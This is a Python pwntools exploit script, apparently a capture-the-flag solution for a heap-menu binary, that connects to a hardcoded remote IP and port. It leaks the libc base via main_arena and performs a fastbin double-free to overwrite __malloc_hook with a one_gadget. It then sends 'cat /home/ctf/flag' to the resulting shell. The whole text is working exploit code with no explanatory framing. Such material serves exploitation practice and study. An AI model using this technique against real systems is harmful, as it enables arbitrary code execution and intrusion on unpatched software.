from pwn import *
from LibcSearcher import LibcSearcher

# context.log_level = "debug"
p = process("./pwn")
p = remote("43.254.3.203" , 10006)
elf = ELF("./pwn")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/home/pwn/libc/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")
def add(size , kind  , name = "none" ):
	p.sendlineafter("choice : " , "1")
	p.sendlineafter("name :" , str(size))
	p.recvuntil("animal :")
	if name != "none":
		p.send(name)
	p.sendlineafter("animal :" , kind)

def check(range_turn):
	p.sendlineafter("choice : " , "2")
	addr = []
	# print p.recv()
	for i in range(range_turn):
		p.recvuntil("Name of the animal[%d] :" % i)
		addr.append(u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00")))
		p.recvuntil("\n")
	return addr

def delete(index):
	p.sendlineafter("choice : " , "3")
	p.sendlineafter("from the cage:" , str(index))

def clean():
	p.sendlineafter("choice : " , "4")
fake_size = 0x60
add(0xe0 , "test" , "test0") # 0 
add(fake_size , "test" , "test1") # 1
add(fake_size , "test" , "test2") # 2 

delete(0)
clean()

add(0,"test")
# print(hex(check(2)[0]))
main_arena = check(2)[0] - 312
malloc_hook = main_arena - 0x10
puts = lambda x,y : log.success(("%s : %s" % (x , hex(y))))
puts("main_arena" , main_arena)
# libc = LibcSearcher("__malloc_hook" , malloc_hook)
libc_base = malloc_hook - libc.sym["__malloc_hook"]
one_gadgets = [0x45216 , 0x4526a , 0xf02a4 , 0xf1147]
one_gadget = libc_base + one_gadgets[1]
fake_chunk_offset = 0x3c4af5 - 8
fake_chunk_addr  = libc_base + fake_chunk_offset
padding = 0x13
payload = padding * "a" + p64(one_gadget)

# p.recv()
delete(2) 
delete(1)
delete(2)

add(fake_size , "test" , p64(fake_chunk_addr))
add(fake_size , "test" , "test")
add(fake_size , "test" , "test")
add(fake_size , "test" , payload)
# gdb.attach(p , "b malloc")
p.sendlineafter("choice : " , "1")
# p.sendlineafter("name :" , str(fake_size))
# add(fake_size , "test" , "#")
p.sendline("cat /home/ctf/flag")
flag = p.recv()
print(flag)
# p.interactive() 
# libc_base = malloc_hook - libc.dump("")